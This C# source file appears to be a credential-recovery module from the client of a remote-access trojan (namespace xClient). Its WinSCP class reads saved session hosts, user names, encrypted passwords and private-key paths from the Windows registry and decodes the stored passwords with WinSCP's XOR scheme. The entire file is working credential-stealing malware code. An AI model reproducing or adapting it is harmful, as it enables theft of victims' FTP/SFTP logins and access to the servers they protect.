using System;
using System.Collections.Generic;
using System.Linq;
using Microsoft.Win32;
using xClient.Core.Data;
using xClient.Core.Extensions;
using xClient.Core.Helper;

namespace xClient.Core.Recovery.FtpClients;

public class WinSCP
{
	public static List<RecoveredAccount> GetSavedPasswords()
	{
		List<RecoveredAccount> list = new List<RecoveredAccount>();
		try
		{
			string path = "SOFTWARE\\\\Martin Prikryl\\\\WinSCP 2\\\\Sessions";
			using (RegistryKey registryKey = RegistryKeyHelper.OpenReadonlySubKey(RegistryHive.CurrentUser, path))
			{
				string[] subKeyNames = registryKey.GetSubKeyNames();
				foreach (string name in subKeyNames)
				{
					using RegistryKey registryKey2 = registryKey.OpenReadonlySubKeySafe(name);
					if (registryKey2 == null)
					{
						continue;
					}
					string valueSafe = registryKey2.GetValueSafe("HostName");
					if (!string.IsNullOrEmpty(valueSafe))
					{
						string valueSafe2 = registryKey2.GetValueSafe("UserName");
						string text = WinSCPDecrypt(valueSafe2, registryKey2.GetValueSafe("Password"), valueSafe);
						string valueSafe3 = registryKey2.GetValueSafe("PublicKeyFile");
						valueSafe = valueSafe + ":" + registryKey2.GetValueSafe("PortNumber", "22");
						if (string.IsNullOrEmpty(text) && !string.IsNullOrEmpty(valueSafe3))
						{
							text = $"[PRIVATE KEY LOCATION: \"{Uri.UnescapeDataString(valueSafe3)}\"]";
						}
						list.Add(new RecoveredAccount
						{
							URL = valueSafe,
							Username = valueSafe2,
							Password = text,
							Application = "WinSCP"
						});
					}
				}
			}
			return list;
		}
		catch
		{
			return list;
		}
	}

	private static int dec_next_char(List<string> list)
	{
		int num = int.Parse(list[0]);
		int num2 = int.Parse(list[1]);
		return 0xFF ^ ((((num << 4) + num2) ^ 0xA3) & 0xFF);
	}

	private static string WinSCPDecrypt(string user, string pass, string host)
	{
		try
		{
			if (!(user == string.Empty) && !(pass == string.Empty) && !(host == string.Empty))
			{
				List<string> list = pass.Select((char keyf) => keyf.ToString()).ToList();
				List<string> list2 = new List<string>();
				for (int i = 0; i < list.Count; i++)
				{
					if (list[i] == "A")
					{
						list2.Add("10");
					}
					if (list[i] == "B")
					{
						list2.Add("11");
					}
					if (list[i] == "C")
					{
						list2.Add("12");
					}
					if (list[i] == "D")
					{
						list2.Add("13");
					}
					if (list[i] == "E")
					{
						list2.Add("14");
					}
					if (list[i] == "F")
					{
						list2.Add("15");
					}
					if ("ABCDEF".IndexOf(list[i]) == -1)
					{
						list2.Add(list[i]);
					}
				}
				List<string> list3 = list2;
				int num = 0;
				if (dec_next_char(list3) == 255)
				{
					num = dec_next_char(list3);
				}
				list3.Remove(list3[0]);
				list3.Remove(list3[0]);
				list3.Remove(list3[0]);
				list3.Remove(list3[0]);
				num = dec_next_char(list3);
				list3.Remove(list3[0]);
				list3.Remove(list3[0]);
				int num2 = dec_next_char(list3) * 2;
				for (int j = 0; j < num2; j++)
				{
					list3.Remove(list3[0]);
				}
				string text = "";
				for (int k = -1; k < num; k++)
				{
					string text2 = ((char)dec_next_char(list3)).ToString();
					list3.Remove(list3[0]);
					list3.Remove(list3[0]);
					text += text2;
				}
				string text3 = user + host;
				int count = text.IndexOf(text3, StringComparison.Ordinal);
				text = text.Remove(0, count);
				return text.Replace(text3, "");
			}
			return "";
		}
		catch
		{
			return "";
		}
	}
}
